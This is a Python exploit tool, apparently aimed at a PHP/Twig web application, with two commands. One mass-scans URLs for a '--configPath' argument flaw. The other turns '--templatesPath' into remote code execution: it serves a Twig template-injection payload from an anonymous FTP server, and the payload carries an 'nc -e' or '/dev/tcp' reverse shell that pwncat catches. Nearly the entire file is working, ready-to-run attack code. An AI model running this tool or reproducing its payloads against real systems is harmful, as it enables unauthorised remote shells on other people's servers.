import os
import uuid
import socket
import warnings
import requests
import threading
import pwncat.manager
import concurrent.futures
import rich_click as click

from rich import print
from rich.console import Console
from alive_progress import alive_bar
from pyftpdlib.servers import FTPServer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.authorizers import DummyAuthorizer


console = Console()
requests.packages.urllib3.disable_warnings() 
warnings.filterwarnings("ignore", category=RuntimeWarning, module="pyftpdlib.authorizers")

@click.group()
def cli():
    pass

@cli.command()
@click.option('-u', '--url', required=False, help='The target URL for checking')
@click.option('-f', '--file', required=False, type=click.Path(exists=True), help='File containing a list of URLs')
@click.option('-t', '--threads', default=10, type=int, help='Number of concurrent threads')
@click.option('-o', '--output', required=False, type=click.Path(), help='Output file to save results')
def check(url, file, threads, output):
    """Check if targets are vulnerable."""
    if not url and not file:
        console.print("[bold red]You must specify either a URL or a file containing URLs.[/bold red]")
        return

    targets = []
    if url:
        targets.append(url)
    if file:
        with open(file, 'r') as f:
            targets.extend(line.strip() for line in f if line.strip())

    results = []

    def check_target(target):
        unique_id = str(uuid.uuid4())
        config_path = f"/{unique_id}"
        try:
            response = requests.get(f"{target}?--configPath={config_path}", verify=False, timeout=10)
            if response.status_code == 503 and unique_id in response.text and "mkdir()" in response.text:
                console.print(f"[bold green]{target} is vulnerable![/bold green]")
                return f"{target} | VULNERABLE"
            else:
                console.print(f"[bold yellow]{target} is not vulnerable.[/bold yellow]")
                return f"{target} | NOT VULNERABLE"
        except Exception as e:
            console.print(f"[bold red]Failed to check {target}: {e}[/bold red]")
            return f"{target} | ERROR"

    with alive_bar(len(targets), title="Checking targets", enrich_print=False) as bar:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_target, target): target for target in targets}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                results.append(result)
                bar()

    if output:
        try:
            with open(output, 'w') as f:
                f.write("\n".join(results))
            console.print(f"[bold cyan]Results saved to {output}[/bold cyan]")
        except Exception as e:
            console.print(f"[bold red]Failed to save results to {output}: {e}[/bold red]")


@cli.command()
@click.option('-fh', '--ftp-host', default='127.0.0.1', help='The FTP server host')
@click.option('-fp', '--ftp-port', default=2121, type=int, help='The FTP server port')
@click.option('-u', '--url', required=True, help='The target URL for exploitation')
@click.option('-lh', '--lhost', required=True, help='The local host for reverse shell listener')
@click.option('-lp', '--lport', required=True, type=int, help='The local port for reverse shell listener')
@click.option('-px', '--payload', default='bash', type=click.Choice(['nc', 'bash']), help='Payload type to use')
def exploit(ftp_host, ftp_port, url, lhost, lport, payload):
    payload_str = generate_payload(payload, lhost, lport)
    root_dir = "./virtual"
    create_virtual_files(root_dir, payload_str)

    server_thread = threading.Thread(target=start_ftp_server, args=(ftp_host, ftp_port, root_dir), daemon=True)
    server_thread.start()

    listener_thread = threading.Thread(target=start_listener, args=(lhost, lport))
    listener_thread.daemon = True
    listener_thread.start()

    console.print("[bold green]FTP server and listener started[/bold green]")

    trigger_http_request(url, ftp_host, ftp_port)

def generate_payload(payload_type, lhost, lport):
    payloads = {
        "nc": f"nc -e /bin/bash {lhost} {lport}",
        "bash": f"bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"",
    }

    payload = (
        f"{{{{ ['system', '{payloads[payload_type]}'] | sort('call_user_func') }}}}"
    )
    console.print(f"[bold yellow]Payload generated:[/bold yellow] {payload}")
    return payload


def create_virtual_files(root_dir, payload):
    try:
        os.makedirs(f"{root_dir}/default", exist_ok=True)

        with open(f"{root_dir}/default/index.twig", "w") as twig_file:
            twig_file.write(payload)

        with open(f"{root_dir}/default/index.html", "w") as html_file:
            html_file.write("<html><body>Sample HTML</body></html>")

        console.print("[bold green]Virtual files created successfully.[/bold green]")
    except Exception as e:
        console.print(f"[bold red]Failed to create virtual files:[/bold red] {e}")

def start_ftp_server(host, port, root_dir):
    authorizer = DummyAuthorizer()
    authorizer.add_anonymous(root_dir, perm="elradfmw")

    handler = FTPHandler
    handler.authorizer = authorizer

    server = FTPServer((host, port), handler)
    console.print(f"[bold green]FTP server running on {host}:{port}[/bold green]")

    try:
        server.serve_forever()
    except Exception as e:
        console.print(f"[bold red]Error starting FTP server:[/bold red] {e}")

def trigger_http_request(url, ftp_host, ftp_port):
    templates_path = f"ftp://{ftp_host}:{ftp_port}"
    console.print(f"[bold yellow]Sending request to {url} with templatesPath={templates_path}[/bold yellow]")

    try:
        response = requests.get(f"{url}?--templatesPath={templates_path}", verify=False)
        if response.status_code == 200:
            console.print("[bold green]Payload triggered successfully. Check your listener for a session.[/bold green]")
        else:
            console.print(f"[bold red]Failed to trigger payload. HTTP Status:[/bold red] {response.status_code}")
    except Exception as e:
        console.print(f"[bold red]Failed to send HTTP request:[/bold red] {e}")

def start_listener(lhost, lport, timeout=30):
    console.print(f"[bold cyan]Starting listener on {lhost}:{lport}[/bold cyan]")
    with socket.create_server((lhost, int(lport))) as listener:
        listener.settimeout(timeout)
        console.print(f"[bold cyan]Waiting for incoming connection on port {lport}...[/bold cyan]")

        try:
            victim, victim_addr = listener.accept()
            console.print(f"[bold green]Received connection from {victim_addr[0]}:{victim_addr[1]}[/bold green]")

            with pwncat.manager.Manager() as manager:
                manager.create_session(
                    platform="linux", protocol="socket", client=victim
                )
                print("Dropping to pwncat prompt...")
                manager.interactive()
        except socket.timeout:
            console.print(f"[bold red]No reverse shell connection received within {timeout} seconds.[/bold red]")

if __name__ == '__main__':
    cli()
